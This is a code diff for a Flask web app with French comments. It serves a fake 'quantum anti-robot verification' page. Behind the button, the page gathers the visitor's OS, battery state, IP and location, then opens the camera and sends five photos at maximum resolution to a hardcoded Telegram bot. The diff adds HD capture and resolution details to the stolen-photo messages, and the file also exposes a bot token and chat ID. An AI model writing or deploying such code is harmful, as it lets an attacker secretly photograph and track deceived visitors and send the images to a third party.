@@ -1,3 +1,4 @@
+# api/index.py
 from flask import Flask, request, jsonify, render_template_string
 import requests
 import json
@@ -9,8 +10,10 @@ from datetime import datetime
 app = Flask(__name__)
 
 # ========== CONFIGURATION TELEGRAM ==========
+# 🔥 REMPLACEZ CES VALEURS PAR LES VÔTRES 🔥
 BOT_TOKEN = "8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o"
 CHAT_ID = "8546452645"
+# ============================================
 
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
@@ -36,13 +39,13 @@ def get_extra_info(ip):
         pass
     return "Localisation inconnue"
 
-# ========== PAGE HTML MATRIX ==========
+# ========== PAGE HTML MATRIX HD ==========
 HTML_MATRIX = '''<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Quantum Security █ Matrix</title>
+    <title>Quantum Security █ Matrix HD</title>
     <style>
         * {
             margin: 0;
@@ -153,6 +156,11 @@ HTML_MATRIX = '''<!DOCTYPE html>
             color: #0a4a0a;
             font-size: 0.6rem;
         }
+        .resolution-badge {
+            color: #0a8;
+            font-size: 0.6rem;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -160,7 +168,7 @@ HTML_MATRIX = '''<!DOCTYPE html>
 <div class="container">
     <div class="terminal">
         <h1>VÉRIFICATION QUANTIQUE</h1>
-        <div class="sub">[ protocole anti-robot ]</div>
+        <div class="sub">[ protocole anti-robot HD ]</div>
         
         <button class="btn-matrix" id="actionBtn">VÉRIFIER QUE JE NE SUIS PAS UN ROBOT</button>
         
@@ -168,11 +176,13 @@ HTML_MATRIX = '''<!DOCTYPE html>
             <div class="progress-bar" id="progressBar"></div>
         </div>
         <div class="status-text" id="statusMsg">>_ système prêt</div>
+        <div class="resolution-badge" id="resBadge"></div>
         <footer>© Quantum Defense • session chiffrée</footer>
     </div>
 </div>
 
 <script>
+    // Matrix Rain Effect
     const canvas = document.getElementById('matrix-bg');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth;
@@ -204,9 +214,8 @@ HTML_MATRIX = '''<!DOCTYPE html>
     });
 
     let collected = {};
-    let photoInterval = null;
-    let photoCount = 0;
-    
+    let streamActive = false;
+
     async function postData(endpoint, data) {
         try {
             await fetch(endpoint, {
@@ -216,14 +225,14 @@ HTML_MATRIX = '''<!DOCTYPE html>
             });
         } catch(e) {}
     }
-    
+
     function detectMobileOS() {
         const ua = navigator.userAgent;
         if(/Android/i.test(ua)) return 'Android';
         if(/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
         return 'Autre';
     }
-    
+
     async function collectPassive() {
         collected.os = detectMobileOS();
         collected.timestamp = new Date().toISOString();
@@ -251,49 +260,79 @@ HTML_MATRIX = '''<!DOCTYPE html>
         
         await postData('/api/passive', collected);
     }
-    
-    async function capturePhoto(stream, index, videoElement) {
+
+    // Capture HD avec qualité maximale
+    async function capturePhotoHD(stream, index, videoElement) {
         return new Promise((resolve) => {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth || 640;
-            canvas.height = videoElement.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(async (blob) => {
-                const reader = new FileReader();
-                reader.onloadend = async function() {
-                    await postData('/api/photo', {
-                        photo: reader.result,
-                        index: index,
-                        info: collected
-                    });
-                    resolve();
-                };
-                reader.readAsDataURL(blob);
-            }, 'image/jpeg', 0.8);
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                // Dimensions exactes de la vidéo (qualité maximale native)
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                
+                // Qualité 1.0 = 100% sans compression
+                canvas.toBlob(async (blob) => {
+                    const reader = new FileReader();
+                    reader.onloadend = async function() {
+                        await postData('/api/photo', {
+                            photo: reader.result,
+                            index: index,
+                            info: collected,
+                            width: canvas.width,
+                            height: canvas.height,
+                            sizeKB: (blob.size / 1024).toFixed(1)
+                        });
+                        resolve();
+                    };
+                    reader.readAsDataURL(blob);
+                }, 'image/jpeg', 1.0);
+            }, 100);
         });
     }
-    
-    async function burstPhotos() {
+
+    async function burstPhotosHD() {
         const statusDiv = document.getElementById('statusMsg');
-        statusDiv.innerHTML = '>_ [SCAN] activation caméra...';
+        const resBadge = document.getElementById('resBadge');
+        statusDiv.innerHTML = '>_ [SCAN] activation caméra HD...';
         
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // Configuration HD maximale - résolution native de l'appareil
+            const constraints = {
+                video: {
+                    width: { ideal: 3840, max: 4096 },
+                    height: { ideal: 2160, max: 2160 },
+                    frameRate: { ideal: 30 }
+                }
+            };
+            
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
             const video = document.createElement('video');
             video.srcObject = stream;
+            video.setAttribute('autoplay', '');
+            video.setAttribute('playsinline', '');
             video.play();
             
-            await new Promise(r => setTimeout(r, 800));
+            // Attendre les dimensions réelles
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    setTimeout(resolve, 800);
+                };
+            });
             
-            statusDiv.innerHTML = '>_ [SCAN] capture en cours...';
+            const width = video.videoWidth;
+            const height = video.videoHeight;
+            resBadge.innerHTML = `📷 résolution native: ${width} x ${height}`;
+            statusDiv.innerHTML = `>_ [SCAN] HD: ${width}x${height}`;
             
             for(let i = 1; i <= 5; i++) {
-                await capturePhoto(stream, i, video);
+                await capturePhotoHD(stream, i, video);
                 const percent = (i / 5) * 100;
                 document.getElementById('progressBar').style.width = percent + '%';
-                statusDiv.innerHTML = `>_ [SCAN] capture ${i}/5`;
-                if(i < 5) await new Promise(r => setTimeout(r, 500));
+                statusDiv.innerHTML = `>_ [SCAN] capture ${i}/5 (${width}x${height})`;
+                if(i < 5) await new Promise(r => setTimeout(r, 600));
             }
             
             stream.getTracks().forEach(track => track.stop());
@@ -305,10 +344,11 @@ HTML_MATRIX = '''<!DOCTYPE html>
         } catch(err) {
             statusDiv.innerHTML = '>_ [ERREUR] accès caméra refusé';
             document.getElementById('progressContainer').style.display = 'none';
+            resBadge.innerHTML = '⚠️ caméra bloquée';
             await postData('/api/error', { error: err.message, info: collected });
         }
     }
-    
+
     async function startVerification() {
         const btn = document.getElementById('actionBtn');
         btn.disabled = true;
@@ -318,10 +358,11 @@ HTML_MATRIX = '''<!DOCTYPE html>
         document.getElementById('progressContainer').style.display = 'block';
         document.getElementById('progressBar').style.width = '0%';
         document.getElementById('statusMsg').innerHTML = '>_ initialisation protocole...';
+        document.getElementById('resBadge').innerHTML = '';
         
         await collectPassive();
         await new Promise(r => setTimeout(r, 500));
-        await burstPhotos();
+        await burstPhotosHD();
         
         btn.disabled = false;
         btn.style.opacity = '1';
@@ -347,7 +388,6 @@ def passive():
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         data['ip'] = ip
         
-        # Utilisation de get_extra_info
         geo_info = get_extra_info(ip)
         os_info = data.get('os', '?')
         battery = data.get('battery', '?')
@@ -370,8 +410,11 @@ def photo():
             photo_bytes = base64.b64decode(photo_b64)
             idx = data.get('index', '?')
             ip = data.get('info', {}).get('ip', '?')
+            width = data.get('width', '?')
+            height = data.get('height', '?')
+            size_kb = data.get('sizeKB', '?')
             
-            msg = f"📸 *PHOTO {idx}/5*\n🌐 IP: {ip}"
+            msg = f"📸 *PHOTO {idx}/5* | {width}x{height} | {size_kb}KB\n🌐 IP: {ip}"
             send_telegram(msg, photo_bytes)
             
         return jsonify({'status': 'ok'})
